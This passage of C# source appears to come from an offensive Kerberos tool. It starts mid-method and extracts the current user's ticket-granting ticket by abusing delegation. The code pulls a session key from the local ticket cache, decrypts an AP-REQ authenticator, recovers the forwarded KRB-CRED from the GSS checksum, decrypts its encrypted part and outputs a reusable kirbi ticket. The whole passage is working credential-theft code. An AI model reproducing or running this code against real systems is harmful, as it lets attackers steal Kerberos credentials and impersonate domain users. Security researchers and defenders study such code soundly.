                    foreach(AsnElt elt in asn_AP_REQ.FirstElement.EnumerateElements()) {
                        if (elt.TagValue == 4) {
                            // build the encrypted authenticator
                            EncryptedData encAuthenticator = new EncryptedData(elt.FirstElement);
                            Interop.KERB_ETYPE authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);

                            // grab the service ticket session key from the local cache
                            byte[] key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);

                            if (null == key) {
                                Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
                                return null;
                            }
                            Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}",
                                Convert.ToBase64String(key));

                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                            byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
                            AsnElt asnAuthenticator = AsnElt.Decode(rawBytes, false);

                            foreach (AsnElt elt2 in asnAuthenticator.FirstElement.EnumerateElements()) {
                                if (elt2.TagValue == 3) {
                                    Console.WriteLine("[+] Successfully decrypted the authenticator");
                                    int cksumtype = Convert.ToInt32(elt2.FirstElement.FirstElement.FirstElement.GetInteger());

                                    // check if cksumtype == GSS_CHECKSUM_TYPE
                                    if (cksumtype != 0x8003) {
                                        Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);
                                        return null;
                                    }
                                    byte[] checksumBytes = elt2.FirstElement.SecondElement.FirstElement.GetOctetString();

                                    // check if the flags include GSS_C_DELEG_FLAG
                                    if ((checksumBytes[20] & 1) == 1) {
                                        ushort dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                        byte[] krbCredBytes = new byte[dLen];
                                        // copy out the krbCredBytes from the checksum structure
                                        Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);
                                        AsnElt asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);
                                        KRB_CRED cred = new KRB_CRED();

                                        foreach (AsnElt elt3 in asn_KRB_CRED.FirstElement.EnumerateElements()) {
                                            if (elt3.TagValue == 2) {
                                                // extract the TGT and add it to the KRB-CRED
                                                cred.Tickets.Add(
                                                    new Ticket(elt3.FirstElement.FirstElement.FirstElement));
                                            }
                                            else if (elt3.TagValue == 3) {
                                                byte[] enc_part = elt3.FirstElement.SecondElement.GetOctetString();

                                                // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
                                                byte[] rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);

                                                // decode the decrypted plaintext enc par and add it to our final cred object
                                                AsnElt encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
                                                cred.EncryptedPart.ticket_info.Add(
                                                    new KrbCredInfo(encKrbCredPartAsn.FirstElement.FirstElement.FirstElement.FirstElement));
                                            }
                                        }

                                        byte[] kirbiBytes = cred.Encode().Encode();
                                        Helpers.DisplayKerberosTicket(kirbiBytes);
                                        return kirbiBytes;
                                    }
                                }
                            }
                        }
                    }
                    return null;
                }
                finally {
                    // cleanup 1
                    Interop.DeleteSecurityContext(ref ClientContext);
                    // cleanup 2
                    //Interop.FreeContextBuffer(ref ClientToken.pBuffers);
                }
            }
            finally {
                // cleanup 2
                Interop.FreeCredentialsHandle(ref phCredential);
            }
        }

        private static readonly Interop.LSA_STRING_IN KerberosLsaInputString =
            new Interop.LSA_STRING_IN("kerberos");
    }
}
